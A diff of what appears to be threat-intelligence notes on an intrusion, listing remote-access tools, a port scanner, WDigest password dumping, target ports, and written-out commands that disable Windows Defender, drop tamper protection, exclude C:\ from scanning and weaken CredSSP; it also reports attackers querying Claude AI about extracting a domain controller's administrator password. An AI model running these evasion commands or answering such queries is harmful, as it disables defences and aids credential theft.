@@ -1,34 +1,36 @@
+**Tools**
 
-Chrome Remote Desktop
-- https://dl.google.com/edgedl/chrome-remote-desktop/chromeremotedesktophost.msi
-AnyDesk
-Remote Desktop
-Remote Desktop Connection Manager
+**Chrome Remote Desktop**
 
-Advanced Port Scanner
+        - https://dl.google.com/edgedl/chrome-remote-desktop/chromeremotedesktophost.msi
 
-WDigest Clear-Text Password Dumping
+**AnyDesk**
 
+**Remote Desktop**
 
+**Remote Desktop Connection Manager**
+
+**Advanced Port Scanner**
+
+**WDigest Clear-Text Password Dumping**
 
 Commands:
 
-Set-MpPreFerence -DisableBehaviorMonitoring $true
-Set-MpPreference -DIsableIOAVProtection $true
-Set-MpPreference -DisablePrivacymode $true
-Set-MpPreference -DisableIntrusionPreventioNSystem $true
-Set-MpPreference -EnableControlledFolderAccess disabled
-Set-MpPreference -MAPSReporting Disabled
-Set-MpPrefErence -SubmitSamplesConsent 2
-reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /D 0 /f
-Add-MpPreference -ExclusionPath "C:\"
-Stop-Service -NamE WinDefend -Force
-Start-Service -Name WinDefend
-
-reg add HKlM\Software\Microsoft\Windows\CurrentVersion\Policies\System\CreDSSP
-reg add HKLM\Software\Microsoft\Windows\CurrentVersion\PolIcies\System\CredSSP\Parameters
-reg add HKLM\Software\Microsoft|Windows\CurrentVersion\Policies\System\CredSSP\Parameters /v AlLowEncryptionOracle /t REG_DWORD /d 2
-
+        * Set-MpPreFerence -DisableBehaviorMonitoring $true
+        * Set-MpPreference -DIsableIOAVProtection $true
+        * Set-MpPreference -DisablePrivacymode $true
+        * Set-MpPreference -DisableIntrusionPreventioNSystem $true
+        * Set-MpPreference -EnableControlledFolderAccess disabled
+        * Set-MpPreference -MAPSReporting Disabled
+        * Set-MpPreference -SubmitSamplesConsent 2
+        * reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /D 0 /f
+        * Add-MpPreference -ExclusionPath "C:\"
+        * Stop-Service -NamE WinDefend -Force
+        * Start-Service -Name WinDefend
+        
+        * reg add HKlM\Software\Microsoft\Windows\CurrentVersion\Policies\System\CreDSSP
+        * reg add HKLM\Software\Microsoft\Windows\CurrentVersion\PolIcies\System\CredSSP\Parameters
+        * reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters /v AlLowEncryptionOracle /t REG_DWORD /d 2
 
 
 MAVEN Repository
@@ -47,8 +49,7 @@ MAVEN Repository
 
 Target Ports:
 
-554,902,3260,5000,5900,5001,8080,8443,3306,9392,445,21,22,3389
-
+        554,902,3260,5000,5900,5001,8080,8443,3306,9392,445,21,22,3389
 
 Attackers uses Claude AI to perform attack.
 Result from Query:
@@ -91,5 +92,6 @@ Result from Query:
         Certificate-based authentication Might need manual setup
 
 Another Query to AI:
+
         if i have hyper v vm for domain controller how to get the administrator password for this dc vm
 
